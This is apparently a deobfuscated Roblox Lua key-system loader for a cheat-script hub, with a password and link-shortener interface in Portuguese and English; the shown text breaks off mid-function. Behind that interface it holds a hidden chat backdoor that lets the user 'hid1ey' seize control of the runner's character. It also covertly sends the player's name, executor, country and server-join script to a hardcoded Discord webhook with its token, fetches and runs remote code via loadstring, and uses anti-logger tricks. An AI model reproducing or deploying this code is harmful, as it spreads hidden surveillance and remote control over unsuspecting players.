-- This file was generated at discord.gg/syncrypt

local t1 = {}
local t2 = {}
local v3 = unpack or table.unpack
_G.ANTIENVLOGBYNEVERWON1 = 1
getgenv().ANTIENVLOGBYNEVERWON2 = 1
getgenv().ANTIENVLOGBYNEVERWON3 = 69
_G.ifucantseeanyprintthenufailedtobypassthisenvlogger = true
_G.ANTIENVLOGGERmadebyclickdetectoronneverwon = true
local v4 = getgenv().ANTIENVLOGBYNEVERWON2 + _G.ANTIENVLOGBYNEVERWON1
local ANTIENVLOGBYNEVERWON1 = _G.ANTIENVLOGBYNEVERWON1
if ANTIENVLOGBYNEVERWON1 then
    t1.value3 = getgenv().ANTIENVLOGBYNEVERWON2
    ANTIENVLOGBYNEVERWON1 = t1.value3

    if t1.value3 then
        t1.value2 = _G.ANTIENVLOGBYNEVERWON1 == 1
        t1.value3 = t1.value2

        if t1.value2 then
            t1.value3 = getgenv().ANTIENVLOGBYNEVERWON2 == 1
        end

        ANTIENVLOGBYNEVERWON1 = t1.value3
    end
end
if ANTIENVLOGBYNEVERWON1 and (v4 and v4 ~= 1 or v4 ~= 3) then
    local v6 = v4 + v4

    t1.value1 = v6

    if v6 then
        t1.value1 = v6 ~= v6 and v6 == 4
    end

    if not t1.value1 then
        t1.value1 = v6 == v6 and v6 ~= 3

        if t1.value1 then
            task.spawn(function()
                while true do
                    local v15 = math.random(1, 1000000)

                    getgenv().ANTIENVLOGBYNEVERWON3 = v15 + 1
                    getgenv().ANTIENVLOGBYNEVERWON2 = getgenv().ANTIENVLOGBYNEVERWON2 + 1
                    _G.ANTIENVLOGBYNEVERWON1 = _G.ANTIENVLOGBYNEVERWON1 + 1
                    task.wait(math.random() / 10)
                end
            end)
        end
    end
end
t2.value1 = game:GetService("Players")
t2.value2 = game:GetService("RunService")
t2.value3 = t2.value1.LocalPlayer
t2.value4 = "hid1ey"
t2.value5 = 4
t2.value6 = 2
t2.value7 = 2
t2.value8 = "/control on"
t2.value9 = "/control off"
t2.value10 = nil
t2.value11 = 0
t2.value12 = false
t2.value13 = false
t2.value10 = nil
function t2.value14()
    for _, player in ipairs(t2.value1:GetPlayers()) do
        if player.Name:lower() == t2.value4:lower() then
            return player
        end
    end

    return nil
end
function t2.value15()
    if t2.value10 then
        t2.value10:Disconnect()
        t2.value10 = nil
    end

    t2.value12 = false
end
function t2.value16()
    if t2.value12 then
        return
    end

    t2.value2.Heartbeat:Connect(function(dt)
        if not t2.value13 then
            t2.value15()

            return
        end

        local v86 = t2.value14()

        if not v86 then
            return
        end

        local Character = v86.Character
        local Character2 = t2.value3.Character

        if not Character or not Character2 then
            return
        end

        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
        local v90 = not HumanoidRootPart
        local HumanoidRootPart2 = Character2:FindFirstChild("HumanoidRootPart")

        if not v90 then
            v90 = not HumanoidRootPart2
        end

        if v90 then
            return
        end

        t2.value11 = t2.value11 + t2.value6 * dt

        local v92 = math.cos(t2.value11)
        local _math = math
        local v94 = v92 * t2.value5
        local v95 = _math.sin(t2.value11) * t2.value5
        local HumanoidRootPartPosition = HumanoidRootPart.Position
        local vector3 = Vector3.new(HumanoidRootPartPosition.X + v94, HumanoidRootPartPosition.Y + t2.value7, HumanoidRootPartPosition.Z + v95)

        HumanoidRootPart2.CFrame = CFrame.new(vector3, Vector3.new(HumanoidRootPartPosition.X, vector3.Y, HumanoidRootPartPosition.Z))
    end)
end
local function v7(p1, p2)
    if p1.Name:lower() ~= t2.value4:lower() then
        return
    end

    local v20 = p2:lower():match("^%s*(.-)%s*$")

    if v20 == t2.value8 then
        if t2.value13 then
            return
        end

        t2.value13 = true
        t2.value16()

        return
    end

    if v20 == t2.value9 then
        if not t2.value13 then
            return
        end

        t2.value13 = false
        t2.value15()
    end
end
local function v8(p3)
    t2.value15()
    p3:WaitForChild("HumanoidRootPart", 10)
    p3:WaitForChild("Humanoid", 10)
    task.wait(0.2)

    if t2.value13 then
        t2.value16()
    end
end
local v9, v10, v11 = ipairs(t2.value1:GetPlayers())

t1.value4 = v9
t1.value6 = v10
t1.value7 = v11
while true do
    local v12, v13 = t1.value4(t1.value6, t1.value7)

    t1.value7 = v12
    t1.value5 = v13

    if not t1.value7 then
        break
    end

    local value5 = t1.value5

    value5.Chatted:Connect(function(message)
        v7(value5, message)
    end)
end
t2.value1.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        v7(player, message)
    end)
end)
t1.value4 = t2.value3
if t1.value4.Character then
    v8(t2.value3.Character)
end
t2.value3.CharacterAdded:Connect(v8)

return function(p4)
    local v25 = not p4

    if not v25 then
        v25 = not p4.HubName or not p4.Script
    end

    if v25 then
        error("Config invalida: HubName ou Script invalido definido")
    end

    local HubName = p4.HubName
    local Script = p4.Script
    local t3 = {
		Links = {
			["https://link-hub.net/5595773/526SUW21il7U"] = "KEY-BH790-YQC-WLP5",
			["https://direct-link.net/5595773/OpeHmeTUkBKl"] = "KEY-JQ315-VKD-SZA8",
			["https://link-center.net/5595773/yFKyvp4z3kuf"] = "KEY-RF628-XPL-MNV4",
			["https://link-hub.net/5595773/sRmXXa1uqafc"] = "KEY-ZE864-MQC-HTN5",
			["https://link-center.net/5595773/zWxTvw59Kfva"] = "KEY-KW391-UDS-OPV2",
			["https://link-center.net/5595773/HgraZyZ31x9J"] = "KEY-HN520-RFA-LGX7",
			["https://link-hub.net/5595773/97G6VYbzk3hP"] = "KEY-QB374-KRX-VMA8",
			["https://direct-link.net/5595773/w8QBv2j3Gsj5"] = "KEY-YM407-PQK-BVS9",
			["https://link-center.net/5595773/aG8hU6XlW497"] = "KEY-NG675-UJC-FRX2",
			["https://link-center.net/5595773/Buw2zF7AnezO"] = "KEY-AW208-YTH-DPZ7",
			["https://link-hub.net/5595773/Qonf7kY7IfJ8"] = "KEY-MX749-EIB-KSU3",
			["https://link-target.net/5595773/DoYjGYvCwMwe"] = "KEY-FD516-LQA-RVO4",
			["https://link-target.net/5595773/lfTO6v7PhKB8"] = "KEY-UT390-SEZ-CGH1",
			["https://link-center.net/5595773/luhxEsTrNqC8"] = "KEY-PL824-WND-OIX6",
			["https://link-target.net/5595773/4lWDZJxaOTTi"] = "KEY-VC631-TYR-MKB9",
			["https://direct-link.net/5595773/qFwkNmkLwX6T"] = "KEY-HS157-FOP-JAE2",
			["https://link-center.net/5595773/o1qWOhrfGMVy"] = "KEY-ZQ903-GNC-UWD8",
			["https://direct-link.net/5595773/h4VLsbXOxZ2t"] = "KEY-BR482-XMV-LPT5"
		},
		LinkExpiryTime = 43200,
		DiscordLink = "https://discord.gg/w6q6Mgh339",
		DiscordLink2 = "https://discord.gg/gezuUjFpDA"
	}
    local _cloneref = cloneref
    local t4 = { game:GetService("HttpService") }
    local v31 = _cloneref(v3(t4))
    local Players = game:GetService("Players")
    local CoreGui = game:GetService("CoreGui")
    local LocalPlayer = Players.LocalPlayer
    local u35 = false

    pcall(function()
        local v99 = game:GetService("LocalizationService").RobloxLocaleId or ""
        local v100 = v99 == "pt-BR"

        if not v100 then
            v100 = v99 == "pt_BR"

            if not v100 then
                v100 = v99:sub(1, 2) == "pt"
            end
        end

        u35 = v100
    end)
    task.spawn(function()
        pcall(function()
            local u197
            pcall(function()
                u197 = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or u197
            end)
            local u198
            pcall(function()
                if identifyexecutor then
                    local ok, result = pcall(identifyexecutor)

                    if ok then
                        ok = result and result ~= ""
                    end

                    if ok then
                        u198 = result

                        return
                    end
                elseif getexecutorname then
                    local ok, result = pcall(getexecutorname)

                    if ok then
                        ok = result and result ~= ""
                    end

                    if ok then
                        u198 = result

                        return
                    end
                else
                    local _EXECUTOR_NAME = EXECUTOR_NAME

                    if _EXECUTOR_NAME then
                        _EXECUTOR_NAME = EXECUTOR_NAME ~= ""
                    end

                    if _EXECUTOR_NAME then
                        u198 = EXECUTOR_NAME
                    end
                end
            end)
            local u199
            pcall(function()
                u199 = LocalPlayer.Name or "Unknown"
            end)
            local u200
            pcall(function()
                local LocalizationService = game:GetService("LocalizationService")
                local RobloxLocaleId = LocalizationService.RobloxLocaleId

                if not RobloxLocaleId then
                    RobloxLocaleId = LocalizationService.SystemLocaleId or "Unknown"
                end

                u200 = ({
					["fa-af"] = "Afeganistão",
					["ps-af"] = "Afeganistão",
					["en-za"] = "África do Sul",
					["af-za"] = "África do Sul",
					["sq-al"] = "Albânia",
					["de-de"] = "Alemanha",
					["ca-ad"] = "Andorra",
					["pt-ao"] = "Angola",
					["en-ag"] = "Antígua e Barbuda",
					["ar-sa"] = "Arábia Saudita",
					["ar-dz"] = "Argélia",
					["es-ar"] = "Argentina",
					["hy-am"] = "Armênia",
					["en-au"] = "Austrália",
					["de-at"] = "Áustria",
					["az-az"] = "Azerbaijão",
					["en-bs"] = "Bahamas",
					["ar-bh"] = "Bahrein",
					["bn-bd"] = "Bangladesh",
					["en-bb"] = "Barbados",
					["nl-be"] = "Bélgica",
					["fr-be"] = "Bélgica",
					["de-be"] = "Bélgica",
					["en-bz"] = "Belize",
					["fr-bj"] = "Benin",
					["be-by"] = "Bielorrússia",
					["ru-by"] = "Bielorrússia",
					["es-bo"] = "Bolívia",
					["bs-ba"] = "Bósnia e Herzegovina",
					["hr-ba"] = "Bósnia e Herzegovina",
					["sr-ba"] = "Bósnia e Herzegovina",
					["en-bw"] = "Botsuana",
					["pt-br"] = "Brasil",
					["ms-bn"] = "Brunei",
					["bg-bg"] = "Bulgária",
					["fr-bf"] = "Burkina Faso",
					["fr-bi"] = "Burundi",
					["pt-cv"] = "Cabo Verde",
					["fr-cm"] = "Camarões",
					["en-cm"] = "Camarões",
					["km-kh"] = "Camboja",
					["en-ca"] = "Canadá",
					["fr-ca"] = "Canadá",
					["ar-qa"] = "Catar",
					["kk-kz"] = "Cazaquistão",
					["ru-kz"] = "Cazaquistão",
					["fr-td"] = "Chade",
					["ar-td"] = "Chade",
					["es-cl"] = "Chile",
					["zh-cn"] = "China",
					["el-cy"] = "Chipre",
					["tr-cy"] = "Chipre",
					["es-co"] = "Colômbia",
					["ar-km"] = "Comores",
					["fr-km"] = "Comores",
					["fr-cg"] = "Congo",
					["fr-cd"] = "Congo (RDC)",
					["ko-kp"] = "Coreia do Norte",
					["ko-kr"] = "Coreia do Sul",
					["fr-ci"] = "Costa do Marfim",
					["es-cr"] = "Costa Rica",
					["hr-hr"] = "Croácia",
					["es-cu"] = "Cuba",
					["da-dk"] = "Dinamarca",
					["fr-dj"] = "Djibuti",
					["ar-dj"] = "Djibuti",
					["en-dm"] = "Dominica",
					["ar-eg"] = "Egito",
					["es-sv"] = "El Salvador",
					["ar-ae"] = "Emirados Árabes Unidos",
					["es-ec"] = "Equador",
					["ti-er"] = "Eritreia",
					["sk-sk"] = "Eslováquia",
					["sl-si"] = "Eslovênia",
					["es-es"] = "Espanha",
					["en-us"] = "Estados Unidos",
					["et-ee"] = "Estônia",
					["en-sz"] = "Eswatini",
					["am-et"] = "Etiópia",
					["en-fj"] = "Fiji",
					["fil-ph"] = "Filipinas",
					["en-ph"] = "Filipinas",
					["fi-fi"] = "Finlândia",
					["sv-fi"] = "Finlândia",
					["fr-fr"] = "França",
					["fr-ga"] = "Gabão",
					["en-gm"] = "Gâmbia",
					["en-gh"] = "Gana",
					["ka-ge"] = "Geórgia",
					["en-gd"] = "Granada",
					["el-gr"] = "Grécia",
					["es-gt"] = "Guatemala",
					["en-gy"] = "Guiana",
					["fr-gn"] = "Guiné",
					["pt-gw"] = "Guiné-Bissau",
					["es-gq"] = "Guiné Equatorial",
					["fr-ht"] = "Haiti",
					["ht-ht"] = "Haiti",
					["es-hn"] = "Honduras",
					["hu-hu"] = "Hungria",
					["ar-ye"] = "Iêmen",
					["en-mh"] = "Ilhas Marshall",
					["en-sb"] = "Ilhas Salomão",
					["hi-in"] = "Índia",
					["en-in"] = "Índia",
					["id-id"] = "Indonésia",
					["fa-ir"] = "Irã",
					["ar-iq"] = "Iraque",
					["en-ie"] = "Irlanda",
					["ga-ie"] = "Irlanda",
					["is-is"] = "Islândia",
					["he-il"] = "Israel",
					["it-it"] = "Itália",
					["en-jm"] = "Jamaica",
					["ja-jp"] = "Japão",
					["ar-jo"] = "Jordânia",
					["en-ki"] = "Kiribati",
					["ar-kw"] = "Kuwait",
					["lo-la"] = "Laos",
					["en-ls"] = "Lesoto",
					["lv-lv"] = "Letônia",
					["ar-lb"] = "Líbano",
					["en-lr"] = "Libéria",
					["ar-ly"] = "Líbia",
					["de-li"] = "Liechtenstein",
					["lt-lt"] = "Lituânia",
					["lb-lu"] = "Luxemburgo",
					["fr-lu"] = "Luxemburgo",
					["de-lu"] = "Luxemburgo",
					["mk-mk"] = "Macedônia do Norte",
					["fr-mg"] = "Madagascar",
					["ms-my"] = "Malásia",
					["en-mw"] = "Malawi",
					["dv-mv"] = "Maldivas",
					["fr-ml"] = "Mali",
					["mt-mt"] = "Malta",
					["en-mt"] = "Malta",
					["ar-ma"] = "Marrocos",
					["en-mu"] = "Maurícia",
					["ar-mr"] = "Mauritânia",
					["es-mx"] = "México",
					["en-fm"] = "Micronésia",
					["pt-mz"] = "Moçambique",
					["ro-md"] = "Moldávia",
					["fr-mc"] = "Mônaco",
					["mn-mn"] = "Mongólia",
					["sr-me"] = "Montenegro",
					["my-mm"] = "Myanmar",
					["en-na"] = "Namíbia",
					["en-nr"] = "Nauru",
					["ne-np"] = "Nepal",
					["es-ni"] = "Nicarágua",
					["fr-ne"] = "Níger",
					["en-ng"] = "Nigéria",
					["no-no"] = "Noruega",
					["en-nz"] = "Nova Zelândia",
					["ar-om"] = "Omã",
					["nl-nl"] = "Países Baixos",
					["en-pw"] = "Palau",
					["es-pa"] = "Panamá",
					["en-pg"] = "Papua Nova Guiné",
					["ur-pk"] = "Paquistão",
					["en-pk"] = "Paquistão",
					["es-py"] = "Paraguai",
					["gn-py"] = "Paraguai",
					["es-pe"] = "Peru",
					["pl-pl"] = "Polônia",
					["pt-pt"] = "Portugal",
					["en-ke"] = "Quênia",
					["ky-kg"] = "Quirguistão",
					["ru-kg"] = "Quirguistão",
					["en-gb"] = "Reino Unido",
					["fr-cf"] = "República Centro-Africana",
					["es-do"] = "República Dominicana",
					["cs-cz"] = "República Tcheca",
					["ro-ro"] = "Romênia",
					["rw-rw"] = "Ruanda",
					["en-rw"] = "Ruanda",
					["ru-ru"] = "Rússia",
					["sm-ws"] = "Samoa",
					["it-sm"] = "San Marino",
					["en-kn"] = "São Cristóvão e Nevis",
					["pt-st"] = "São Tomé e Príncipe",
					["en-vc"] = "São Vicente e Granadinas",
					["fr-sn"] = "Senegal",
					["en-sl"] = "Serra Leoa",
					["sr-rs"] = "Sérvia",
					["en-sc"] = "Seychelles",
					["fr-sc"] = "Seychelles",
					["en-sg"] = "Singapura",
					["zh-sg"] = "Singapura",
					["ar-sy"] = "Síria",
					["so-so"] = "Somália",
					["si-lk"] = "Sri Lanka",
					["ta-lk"] = "Sri Lanka",
					["ar-sd"] = "Sudão",
					["en-ss"] = "Sudão do Sul",
					["sv-se"] = "Suécia",
					["de-ch"] = "Suíça",
					["fr-ch"] = "Suíça",
					["it-ch"] = "Suíça",
					["nl-sr"] = "Suriname",
					["th-th"] = "Tailândia",
					["sw-tz"] = "Tanzânia",
					["en-tz"] = "Tanzânia",
					["tg-tj"] = "Tajiquistão",
					["pt-tl"] = "Timor-Leste",
					["fr-tg"] = "Togo",
					["en-to"] = "Tonga",
					["en-tt"] = "Trinidad e Tobago",
					["ar-tn"] = "Tunísia",
					["tk-tm"] = "Turcomenistão",
					["tr-tr"] = "Turquia",
					["en-tv"] = "Tuvalu",
					["uk-ua"] = "Ucrânia",
					["en-ug"] = "Uganda",
					["es-uy"] = "Uruguai",
					["uz-uz"] = "Uzbequistão",
					["en-vu"] = "Vanuatu",
					["fr-vu"] = "Vanuatu",
					["it-va"] = "Vaticano",
					["es-ve"] = "Venezuela",
					["vi-vn"] = "Vietnã",
					["en-zm"] = "Zâmbia",
					["en-zw"] = "Zimbábue"
				})[string.lower(RobloxLocaleId)] or RobloxLocaleId
            end)
            local HttpService = game:GetService("HttpService")
            local u202 = HttpService
            local function v203(p5)
                local u240 = p5
                local ok, result = pcall(function()
                    return request({
						Url = u240,
						Method = "GET"
					})
                end)
                if ok then
                    ok = result and result.Body
                end
                if ok then
                    return u202:JSONDecode(result.Body)
                end

                return nil
            end
            local s1 = "https://i.imgur.com/default_avatar.png"
            local v205 = v203("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false")
            local v206 = v205
            if v205 then
                v206 = v205.data and v205.data[1]
            end
            if v206 then
                s1 = v205.data[1].imageUrl or s1
            end
            local s2 = "https://i.imgur.com/default_avatar.png"
            local v208 = v203("https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=" .. game.GameId .. "&size=768x432&format=Png&isCircular=false&countPerUniverse=1")
            local v209 = v208
            if v208 then
                v209 = v208.data

                if v209 then
                    v209 = v208.data[1]

                    if v209 then
                        v209 = v208.data[1].thumbnails

                        if v209 then
                            v209 = v208.data[1].thumbnails[1]
                        end
                    end
                end
            end
            if v209 then
                s2 = v208.data[1].thumbnails[1].imageUrl or s2
            end
            local v210 = " " .. "local Players = game:GetService(\"Players\")\n" .. "local TeleportService = game:GetService(\"TeleportService\")\n\n" .. "local player = Players.LocalPlayer\n\n" .. "local placeId = " .. game.PlaceId .. "\n" .. "local jobId = \"" .. game.JobId .. "\"\n\npcall(function()\n    TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\nend)\n "
            local v211 = u202
            local ok, result = pcall(function()
                return loadstring(game:HttpGet("https://credential-request.vercel.app/Hub/Config.js", true))()
            end)
            if ok then
                ok = type(result) == "table" and result.KernelEnabled
            end
            local v214 = "Credential-request " .. (not ok and "[OFFLINE]" or "[ONLINE]")
            local t5 = {
				url = s1
			}
            local t6 = {
				url = s2
			}
            local t7 = {
				name = "**🎮 | Nome do Jogo:**",
				value = "• Unknown Game",
				inline = false
			}
            local v218 = "• " .. HubName
            local t8 = {
				name = "**📜 | Nome do Script:**",
				value = v218,
				inline = false
			}
            local t9 = {
				name = "**🕹\239\184\143 | Nome do Executor:**",
				value = "• Unknown",
				inline = true
			}
            local JSONEncode = v211.JSONEncode
            local t10 = {
				t7,
				t8,
				t9,
				{
					name = "**👤 | Nome do Jogador:**",
					value = "• Unknown",
					inline = true
				},
				{
					name = "**🌎 | País de Origem:**",
					value = "• Unknown",
					inline = false
				},
				{
					name = "**📍 | Script de Teleporte:**",
					value = v210,
					inline = false
				}
			}
            local t11 = {
				text = "Execuções globais"
			}
            local v224 = os.date("!%Y-%m-%dT%H:%M:%SZ")
            local v225 = JSONEncode(v211, {
				username = "Monitor de processamento",
				avatar_url = "https://i.ibb.co/1YbPLH81/1772758094923.jpg",
				embeds = {{
					title = v214,
					color = 16777215,
					thumbnail = t5,
					image = t6,
					fields = t10,
					footer = t11,
					timestamp = v224
				}}
			})
            local _request = request
            local t12 = {
				["Content-Type"] = "application/json"
			}
            _request({
				Url = "https://discord.com/api/webhooks/1513618884161310751/syBa2mifdj3YvsF7vqb2aeckb6jqMTS267b-x64UftG5N5KadGsmRw7n6Uo8P3SO4EgT",
				Method = "POST",
				Headers = t12,
				Body = v225
			})
        end)
    end)

    local ok, result = pcall(function()
        return loadstring(game:HttpGet("https://credential-request.vercel.app/Hub/Config.js", true))()
    end)

    if ok then
        ok = type(result) == "table"
    end

    local v38 = if not ok then nil else result

    if not v38 then
        return
    end

    if not v38.KernelEnabled then
        loadstring(game:HttpGet(Script))()

        return
    end

    local v39 = v38.OpenIcon or "rbxassetid://112738695202091"
    local v40 = v38.ThemeSelect or "darker"
    local v41 = v38.SoundId or ""
    local v42 = v38.SoundVolume or 1

    if not v38._themes_available then
    end

    local v43 = HubName:gsub("%s+", "_")
    local t13 = {}

    t13.__index = t13

    function t13.new()
        local self = setmetatable({}, t13)

        if not isfolder(v43) then
            makefolder(v43)
        end

        return self
    end
    function t13.save(_, p7, p8)

        local u107 = p7
        local u108 = p8
        pcall(function()
            writefile(v43 .. "/" .. u107, v31:JSONEncode(u108))
        end)
    end
    function t13.load(_, p10)
        local v111 = v43 .. "/" .. p10

        if not isfile(v111) then
            return nil
        end

        local ok2, result2 = pcall(function()
            local v228 = v31
            local t14 = { readfile(v111) }

            return v228:JSONDecode(v3(t14))
        end)

        return ok2 and result2 or nil
    end

    local v45 = t13.new()

    local function v46(p11)
        if not v38.PremiumKey or not p11 then
            return false
        end

        return tostring(p11):match("^%s*(.-)%s*$") == tostring(v38.PremiumKey):match("^%s*(.-)%s*$")
    end
    local function v47(p12, p13)
        if p13 == "https://hid1ey.vercel.app/links/Premium" then
            local PremiumMode = v38.PremiumMode
            local v121 = PremiumMode == true

            if not v121 then
                v121 = PremiumMode == "true" or PremiumMode == 1
            end

            if v121 then
                return v46(p12)
            end

            return false
        end

        local v122 = t3.Links[p13]

        if not v122 then
            return false
        end

        return tostring(p12):match("^%s*(.-)%s*$") == tostring(v122):match("^%s*(.-)%s*$")
    end

    local v48 = v45:load("PremiumKey.json")

    if not (not v48 or not v48.key) and v46(v48.key) then
        loadstring(game:HttpGet(Script))()

        return
    end

    local PremiumMode = v38.PremiumMode
    local v50 = PremiumMode == true

    if not v50 then
        v50 = PremiumMode == "true" or PremiumMode == 1
    end

    if v50 and not u35 then
        loadstring(game:HttpGet(Script))()

        return
    end

    local v51 = v45:load("Link.json")
    local v52 = v45:load("Key.json")
    local v53 = v51

    if v51 then
        v53 = v52

        if v53 then
            local v54 = v45:load("Link.json")

            v53 = not (not v54 or not v54.time) and tick() - v54.time <= t3.LinkExpiryTime
        end
    end

    if v53 and v47(v52.key, v51.link) then
        loadstring(game:HttpGet(Script))()

        return
    end

    local function v55()
        pcall(function()
            local WinUI = CoreGui:FindFirstChild("WinUI")

            if WinUI then
                WinUI:Destroy()
            end
        end)
        pcall(function()
            local WinUIFloatBtn = CoreGui:FindFirstChild("WinUIFloatBtn")

            if WinUIFloatBtn then
                WinUIFloatBtn:Destroy()
            end
        end)
    end

    local _loadstring = loadstring
    local t15 = { game:HttpGet("https://win-ui-online.vercel.app/Lib/Src.lua") }
    local v58 = _loadstring(v3(t15))()

    local function v59(p14, p15, p16)
        local v131 = v58
        local v132 = HubName

        if not p14 then
            p14 = ""
        end

        if not p16 then
            p16 = Color3.fromRGB(255, 255, 255)
        end

        local v133 = p15 or 4

        return v131:MakeNotify({
			Title = v132,
			Content = p14,
			Color = p16,
			Delay = v133
		})
    end

    local s3 = ""

    pcall(function()
        s3 = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or ""
    end)

    local v61 = v58
    local v62 = HubName .. (s3 ~= "" and " | " .. s3 or "" .. " | " .. (function()
        if identifyexecutor then
            local ok3, result3 = pcall(identifyexecutor)

            if ok3 then
                ok3 = result3 and result3 ~= ""
            end

            if ok3 then
                return result3
            end
        end

        if getexecutorname then
            local ok4, result4 = pcall(getexecutorname)

            if ok4 then
                ok4 = result4 and result4 ~= ""
            end

            if ok4 then
                return result4
            end
        end

        local _EXECUTOR_NAME = EXECUTOR_NAME

        if _EXECUTOR_NAME then
            _EXECUTOR_NAME = EXECUTOR_NAME ~= ""
        end

        if _EXECUTOR_NAME then
            return EXECUTOR_NAME
        end

        return "Unknown"
    end)())
    local Window = v61.Window
    local color3 = Color3.fromRGB(255, 255, 255)
    local u65 = Window(v61, {
		Title = v62,
		Color = color3,
		Version = 1,
		ThemePreset = v40
	})
    local v66 = v58
    local color3_2 = Color3.fromRGB(255, 255, 255)
    local color3_3 = Color3.fromRGB(35, 35, 35)
    local FloatBtn = v66.FloatBtn
    local _holder = u65._holder

    u65:RegisterFloat((FloatBtn(v66, {
		Icon = v39,
		Color = color3_2,
		ColorDark = color3_3,
		Size = 46,
		MainHolder = _holder
	})))

    if v41 ~= "" then
        task.spawn(function()
            local Sound = Instance.new("Sound")

            Sound.SoundId = v41
            Sound.Volume = v42
            Sound.RollOffMaxDistance = 1000
            Sound.Parent = game:GetService("SoundService")

            if not Sound.IsLoaded then
                Sound.Loaded:Wait()
            end

            Sound:Play()
            game:GetService("Debris"):AddItem(Sound, 15)
        end)
    end

    task.delay(0.5, function()
        v59(not u35 and "Password system active!" or "Sistema de senha ativo!", 4, Color3.fromRGB(100, 220, 180))
    end)

    local v71 = u65:AddTab({
		Name = not u35 and "Verify" or "Verificar",
		Icon = "rbxassetid://7733965118"
	}):AddSection(not u35 and "Get a password to continue" or "Pegue uma senha para continuar", true)

    v71:AddButton({
		Title = not u35 and "Generate Link (Click Here)" or "Gerar Link (Clique Aqui)",
		Callback = function()
        local PremiumMode2 = v38.PremiumMode
        local v136 = PremiumMode2 == true
        if not v136 then
            v136 = PremiumMode2 == "true" or PremiumMode2 == 1
        end
        if v136 then
            if u35 then
                local v137 = v45
                local save = v137.save
                local timestamp = tick()

                save(v137, "Link.json", {
						link = "https://hid1ey.vercel.app/links/Premium",
						time = timestamp
					})
                setclipboard("https://hid1ey.vercel.app/links/Premium")
                v59(not u35 and "Premium link copied!" or "Link Premium copiado! Cole no navegador e use a senha Premium.", 5, Color3.fromRGB(255, 215, 0))

                return
            end

            local color3_4 = Color3.fromRGB(100, 255, 150)
            local v141 = v58
            local v142 = HubName

            if not color3_4 then
                color3_4 = Color3.fromRGB(255, 255, 255)
            end

            v141:MakeNotify({
					Title = v142,
					Content = "Access granted!",
					Color = color3_4,
					Delay = 3
				})
            task.wait(1)
            v55()
            u65 = nil
            loadstring(game:HttpGet(Script))()

            return
        end
        local t16 = {}
        for v146 in pairs(t3.Links) do

            if v146 ~= "https://hid1ey.vercel.app/links/Premium" then
                table.insert(t16, v146)
            end
        end
        if #t16 == 0 then
            v59(not u35 and "No link found" or "Nenhum link encontrado", 3, Color3.fromRGB(255, 100, 100))

            return
        end
        local v147 = t16[math.random(1, #t16)]
        local v148 = v45
        local save = v148.save
        local timestamp = tick()
        save(v148, "Link.json", {
				link = v147,
				time = timestamp
			})
        setclipboard(v147)
        v59(not u35 and "Link copied! Paste it in your browser." or "Link copiado para seu clipboard, cole no navegador!", 5, Color3.fromRGB(255, 220, 100))
    end
	})

    local s4 = ""
    local v73 = not u35 and "Enter the password:" or "Digite a senha:"
    local v74 = not u35 and "Access Password" or "Senha de Acesso"

    v71:AddInput({
		Title = v73,
		Content = v74,
		Default = "",
		Callback = function(p17)
        s4 = p17
    end
	})
    v71:AddButton({
		Title = not u35 and "Confirm Password" or "Confirmar Senha",
		Callback = function()
        if s4 == "" then
            v59(not u35 and "Please enter a password" or "Por favor, digite uma senha", 3, Color3.fromRGB(255, 150, 80))

            return
        end

        local PremiumMode3 = v38.PremiumMode
        local v153 = PremiumMode3 == true

        if not v153 then
            v153 = PremiumMode3 == "true" or PremiumMode3 == 1
        end

        if v153 and u35 then
            if v46(s4) then
                v45:save("PremiumKey.json", {
						key = s4
					})
                v59(not u35 and "Premium access permanently activated!" or "Acesso Premium ativado permanentemente!", 4, Color3.fromRGB(255, 215, 0))
                task.wait(1)
                v55()
                u65 = nil
                loadstring(game:HttpGet(Script))()

                return
            end

            v59(not u35 and "Invalid Premium key. Check and try again." or "Senha Premium inválida. Verifique e tente novamente.", 4, Color3.fromRGB(255, 80, 80))

            return
        end

        if v46(s4) then
            v45:save("PremiumKey.json", {
					key = s4
				})
            v59(not u35 and "Premium access permanently activated!" or "Acesso Premium ativado permanentemente!", 4, Color3.fromRGB(255, 215, 0))
            task.wait(1)
            v55()
            u65 = nil
            loadstring(game:HttpGet(Script))()

            return
        end

        local v154 = v45:load("Link.json")
        local v155 = not v154

        if not v155 then
            local v156 = v45:load("Link.json")

            v155 = not (not (not v156 or not v156.time) and tick() - v156.time <= t3.LinkExpiryTime)
        end

        if v155 then
            v59(not u35 and "Generate a new link to continue" or "Gere um novo link para continuar", 4, Color3.fromRGB(255, 100, 100))

            return
        end

        if v47(s4, v154.link) then
            local v157 = v45
            local save = v157.save
            local v159 = s4
            local timestamp = tick()

            save(v157, "Key.json", {
					key = v159,
					time = timestamp
				})
            v59(not u35 and "Access granted successfully!" or "Acesso liberado com sucesso!", 3, Color3.fromRGB(100, 255, 150))
            task.wait(1)
            v55()
            u65 = nil
            loadstring(game:HttpGet(Script))()

            return
        end

        v59(not u35 and "Wrong password, try again" or "Verifique a senha e tente novamente", 4, Color3.fromRGB(255, 80, 80))
    end
	})

    local v75 = u65:AddTab({
		Name = "Premium",
		Icon = "rbxassetid://127843403295538"
	}):AddSection(not u35 and "Get your PERMANENT Access" or "Adquira seu Acesso PERMANENTE", true)
    local v76 = not u35 and "Exclusive Premium Benefits" or "Beneficios Exclusivos do Premium"
    local AddParagraph = v75.AddParagraph
    local v78 = (function(p18, p19)
        return u35 and p18 or p19
    end)("- Acesso PERMANENTE e ILIMITADO\n- Sem precisar de links ou encurtadores\n- Senha que nunca expira\n- Suporte VIP no Discord\n- Acesso antecipado aos novos recursos", "- PERMANENT and UNLIMITED access\n- No need for links or shorteners\n- Password that never expires\n- VIP Discord support\n- Early access to new features")

    AddParagraph(v75, {
		Title = v76,
		Content = v78
	})

    if u35 then
        v75:AddButton({
			Title = "Copiar link do Discord",
			Callback = function()
            setclipboard(t3.DiscordLink)

            local color3_5 = Color3.fromRGB(114, 137, 218)
            local v162 = v58
            local v163 = HubName

            if not color3_5 then
                color3_5 = Color3.fromRGB(255, 255, 255)
            end

            v162:MakeNotify({
					Title = v163,
					Content = "Link copiado. Entre no servidor para adquirir o Acesso Definitivo.",
					Color = color3_5,
					Delay = 5
				})
        end
		})
    else
        v75:AddButton({
			Title = "Copy Discord link",
			Callback = function()
            setclipboard(t3.DiscordLink2)

